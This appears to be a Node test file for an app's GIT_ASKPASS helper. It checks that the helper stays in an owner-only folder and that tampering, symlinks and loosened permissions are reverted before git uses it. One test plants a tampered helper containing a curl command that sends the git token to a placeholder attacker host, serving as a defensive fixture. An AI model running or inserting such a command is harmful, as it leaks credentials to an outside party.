/**
 * The GIT_ASKPASS helper (services/app-git.ts `ensureAskPass`, audit B-M8,
 * `.claude/rules/sync-guards.md`): git runs it outside the agent's sandbox and it sees the sync
 * pass, so it lives in the app's own folder and is checked before every use.
 *
 * Guards:
 * - it is under the app's git folder (`<userData>/git/askpass/`), never the shared temp folder;
 * - folder and file are the owner's alone (0700, no group / other bits);
 * - a changed helper (content, a symlink in its place, loosened permissions) is put back before
 *   the next git gets its path; what a symlink pointed at is left untouched;
 * - the git the app builds is given that checked path.
 */
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { chmodSync, lstatSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import path from 'node:path'
import { createAppGit, ensureAskPass } from '../electron/services/app-git'

const posix = process.platform !== 'win32'
const EXPECTED = posix ? '#!/bin/sh\necho "$GIT_TOKEN"\n' : '@echo %GIT_TOKEN%\r\n'

function withDir(run: (appGitDir: string) => void | Promise<void>) {
  const base = mkdtempSync(path.join(tmpdir(), 'acb-askpass-'))
  return Promise.resolve(run(path.join(base, 'git'))).finally(() => rmSync(base, { recursive: true, force: true }))
}

test('the helper lives in the app\'s git folder, owner-only, with the app\'s content', () => withDir(appGitDir => {
  const p = ensureAskPass(appGitDir)
  assert.equal(path.dirname(p), path.join(path.resolve(appGitDir), 'askpass'))
  assert.ok(!p.startsWith(path.join(tmpdir(), 'acb-git-helpers')))
  assert.equal(readFileSync(p, 'utf8'), EXPECTED)
  if (posix) {
    assert.equal(lstatSync(p).mode & 0o777, 0o700)
    assert.equal(lstatSync(path.dirname(p)).mode & 0o777, 0o700)
  }
}))

test('a rewritten helper is put back before the next use', () => withDir(appGitDir => {
  const p = ensureAskPass(appGitDir)
  writeFileSync(p, '#!/bin/sh\ncurl -d "$GIT_TOKEN" https://evil.example\necho "$GIT_TOKEN"\n')
  assert.equal(ensureAskPass(appGitDir), p)
  assert.equal(readFileSync(p, 'utf8'), EXPECTED)
}))

test('a symlink in its place is replaced by the app\'s own file; its target is left alone', { skip: !posix }, () => withDir(appGitDir => {
  const p = ensureAskPass(appGitDir)
  const elsewhere = path.join(path.dirname(path.dirname(appGitDir)), 'evil.sh')
  writeFileSync(elsewhere, EXPECTED) // even with the right content
  rmSync(p)
  symlinkSync(elsewhere, p)
  ensureAskPass(appGitDir)
  assert.ok(lstatSync(p).isFile())
  assert.equal(readFileSync(elsewhere, 'utf8'), EXPECTED)
}))

test('loosened permissions are tightened again (nobody else may write it)', { skip: !posix }, () => withDir(appGitDir => {
  const p = ensureAskPass(appGitDir)
  chmodSync(p, 0o777)
  chmodSync(path.dirname(p), 0o777)
  ensureAskPass(appGitDir)
  assert.equal(lstatSync(p).mode & 0o777, 0o700)
  assert.equal(lstatSync(path.dirname(p)).mode & 0o777, 0o700)
}))

test('the app\'s git is given the checked helper', () => withDir(async appGitDir => {
  const repo = mkdtempSync(path.join(tmpdir(), 'acb-askpass-repo-'))
  try {
    const helper = ensureAskPass(appGitDir)
    writeFileSync(helper, 'tampered')
    // Building the app's git checks the helper first (the tampered one never reaches git).
    const git = createAppGit({ token: () => 'tok', appGitDir: () => appGitDir }).create(repo)
    assert.equal(readFileSync(helper, 'utf8'), EXPECTED)
    await git.init()
  } finally {
    rmSync(repo, { recursive: true, force: true })
  }
}))
